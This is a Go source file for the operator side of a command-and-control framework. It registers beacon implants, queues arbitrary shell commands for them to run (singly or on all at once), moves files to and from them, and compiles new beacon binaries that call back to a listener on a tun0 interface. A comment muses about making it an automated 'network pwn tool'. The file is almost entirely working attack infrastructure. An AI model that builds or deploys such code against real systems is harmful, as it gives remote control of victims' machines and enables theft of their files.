package main

import (
	"fmt"
	"time"
	"net"
	"strconv"
	"os"
	"os/exec"
	"strings"
	"bufio"
)

type CommandUpdate struct {
	Ip string
	Id string
	Type string
	Data string
}

type Beacon struct {
	Ip string
	Id string
	ExecBuffer []string
	DownloadBuffer []string
	UploadBuffer []string
	LastSeen time.Time
}

var listeners []HttpListener = make([]HttpListener, 0)
var beacons []*Beacon = make([]*Beacon, 0)
var activeBeacon *Beacon
var cmdArgs = map[string]string {
    "help": "<command>...",
	"list": "",
	"listeners": "",
	"httplistener": "<iface> <hostname> <port>",
    "exec": "<beacon id OR index> <command>...",
    "create": "<listener>",
	"download": "<beacon id OR index> <remote file> OR <remote file>...",
	"upload": "<beacon id OR index> <local file> OR <local file>...",
	"use": "<beacon id OR index>",
	"script": "<beacon id OR index> <local file path> <remote executor path>",
}

/*


potentially turn into automated network pwn tool?


*/

func getIfaceIp(iface string) (string) {
	ief, _ := net.InterfaceByName(iface)
	addrs, _ := ief.Addrs()
	return strings.Split(addrs[0].String(), "/")[0]
}

func registerBeacon(updateData CommandUpdate) (*Beacon) {
	var beacon *Beacon
	for _, b := range beacons {
		if b.Id == updateData.Id {
			beacon = b 
		}
	}

	if beacon == nil {
		beacon = &Beacon{updateData.Ip, updateData.Id, nil, nil, nil, time.Now()}
		beacons = append(beacons, beacon)
	} else {
		beacon.LastSeen = time.Now()
	}

	return beacon
}

func listBeacons() {
	for i, b := range beacons {
		fmt.Println("[" + strconv.Itoa(i) + "] " + b.Id + "@" + b.Ip + " last seen " + b.LastSeen.String())
	}
}

func createBeacon(listener int) {
	ip := getIfaceIp(listeners[listener].iface)
	port := strconv.Itoa(listeners[listener].port)
	beaconName := "beacon" + ip + "." + port
	exec.Command("/bin/sh", "-c", "env CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags '-X main.cmdAddress=" + ip + " -X main.cmdPort=" + port + " -X main.cmdHost=command.com' -o out/" + beaconName + " beacon/*.go").Output()
	fmt.Println("Created beacon in out directory.")
}

func execOnBeacon(cmd []string) {
	if cmd[1] == "*" {
		for _, b := range beacons {
			b.ExecBuffer = append(b.ExecBuffer, strings.Join(cmd[2:], " "))
		}
		return	
	}

	var beacon *Beacon = activeBeacon
	var cmdIndex = 1
	if beacon == nil {
		beacon = getBeaconByIdOrIndex(cmd[1])
		cmdIndex = 2
	}

	if beacon != nil {
		beacon.ExecBuffer = append(beacon.ExecBuffer, strings.Join(cmd[cmdIndex:], " "))
		fmt.Println("Added exec command to buffer for beacon " + beacon.Id + "@" + beacon.Ip)
	} else {
		fmt.Println("Beacon " + cmd[1] + " does not exist. Use list to show available beacons.")
	}
}

func downloadFile(cmd []string) {
	if cmd[1] == "*" {
		for _, b := range beacons {
			b.DownloadBuffer = append(b.DownloadBuffer, cmd[2])
		}
		return	
	}

	var beacon *Beacon = activeBeacon
	var cmdIndex = 1
	if beacon == nil {
		beacon = getBeaconByIdOrIndex(cmd[1])
		cmdIndex = 2
	}

	if beacon != nil {
		beacon.DownloadBuffer = append(beacon.DownloadBuffer, cmd[cmdIndex])
		fmt.Println("Added download command for beacon " + beacon.Id + "@" + beacon.Ip)
	} else {
		fmt.Println("Beacon " + cmd[1] + " does not exist. Use list to show available beacons.")
	}
}

func uploadFile(cmd []string) {
	if cmd[1] == "*" {
		for _, b := range beacons {
			b.UploadBuffer = append(b.UploadBuffer, cmd[2])
		}
		return	
	}

	var beacon *Beacon = activeBeacon
	var cmdIndex = 1
	if beacon == nil {
		beacon = getBeaconByIdOrIndex(cmd[1])
		cmdIndex = 2
	}

	if beacon != nil {
		beacon.UploadBuffer = append(beacon.UploadBuffer, cmd[cmdIndex])
		fmt.Println("Added upload command for beacon " + beacon.Id + "@" + beacon.Ip)
	} else {
		fmt.Println("Beacon " + cmd[1] + " does not exist. Use list to show available beacons.")
	}
}

func getBeaconByIdOrIndex(id string) (*Beacon) {
	var beacon *Beacon

	for _, b := range beacons {
		if b.Id == id {
			beacon = b
		}
	}

	bId, err := strconv.Atoi(id)
	
	if beacon != nil || (err == nil && bId < len(beacons)) {
		if beacon == nil {
			beacon = beacons[bId]
		}
		return beacon
	} else {
		return nil
	}
}

func checkArgs(cmd[] string) (bool) {
	amt := strings.Count(cmdArgs[cmd[0]], "<")
	if len(cmd[1:]) != amt && !strings.Contains(cmdArgs[cmd[0]], "...") {
		if amt == 1 {
			fmt.Println(cmd[0] + " requires " + strconv.Itoa(amt) + " arg: " + cmdArgs[cmd[0]])
		} else {
			fmt.Println(cmd[0] + " requires " + strconv.Itoa(amt) + " args: " + cmdArgs[cmd[0]])
		}
		return false
	}
	return true
}

func printHelp(cmd []string) {
	if len(cmd) == 2 {
		if val, ok := cmdArgs[cmd[1]]; ok {
			fmt.Println(cmd[1] + " usage: " + strings.ReplaceAll(val, "...", ""))
		} else {
			fmt.Println("Command " + cmd[0] + " does not exist.")
		}
	} else {
		for key, val := range cmdArgs {
			fmt.Println(key + " " + strings.ReplaceAll(val, "...", ""))
		}
	}
}

func startHttpListener(cmd []string) {
	port, err := strconv.Atoi(cmd[3])

	if err != nil {
		fmt.Println("usage: " + cmdArgs["httplistener"])
		return
	}

	var HttpListener = HttpListener {
		iface: cmd[1],
		hostname: cmd[2],
		port: port,
	}

	err = HttpListener.startListener()
	if err != nil {
		fmt.Println("Failed to start http server.")
	}

	fmt.Println("Started HTTP listener for " + getIfaceIp(HttpListener.iface) + ":" + cmd[3])
	listeners = append(listeners, HttpListener)
}

func listListeners() {
	fmt.Println("---- HTTP Listeners ----")
	for i, listener := range listeners {
		fmt.Println("[" + strconv.Itoa(i) + "] " + getIfaceIp(listener.iface) + ":" + strconv.Itoa(listener.port) + " (" + listener.iface + ")")
	}
}

func processInput(input string) {
	cmd := strings.Fields(input);
	if len(cmd) > 0 && checkArgs(cmd) {
		switch cmd[0] {
		//case "script":
			//uploadAndExec(cmd)
		case "listeners":
			listListeners()
		case "httplistener":
			startHttpListener(cmd)
		case "exec":
			execOnBeacon(cmd)
		case "create":
			l, err := strconv.Atoi(cmd[1])
			if err != nil {
				fmt.Println("usage: " + cmdArgs["create"])
				return
			}
			createBeacon(l)
		case "list":
			listBeacons()
		case "upload":
			uploadFile(cmd)
		case "download":
			downloadFile(cmd)
		case "use":
			activeBeacon = getBeaconByIdOrIndex(cmd[1])
			if activeBeacon == nil {
				fmt.Println("Beacon " + cmd[1] + " does not exist. Use list to show available beacons.")
			}
		case "help":
			printHelp(cmd)
		default:
			fmt.Println(cmd[0] + " is not a command. Use help to show available commands.")
		}
	}
}

func prompt() {
	if activeBeacon != nil {
		fmt.Print(activeBeacon.Id + "@" + activeBeacon.Ip + " ")
	}

	fmt.Print("c2> ")
}

func handleInput() {
	reader := bufio.NewReader(os.Stdin)
	first := true
	for {
		if first {
			first = false
		} else {
			fmt.Println()
		}
		
		prompt()
		input, err := reader.ReadString('\n')

        if err != nil {
            fmt.Fprintln(os.Stderr, err)
        }

		processInput(input)
	}
}

func main() {
	
	var HttpListener = HttpListener {
		iface: "tun0",
		hostname: "command.com",
		port: 8001,
	}

	var err = HttpListener.startListener()
	if err != nil {
		fmt.Println("Failed to start http server.")
	}

	listeners = append(listeners, HttpListener)
	handleInput()
}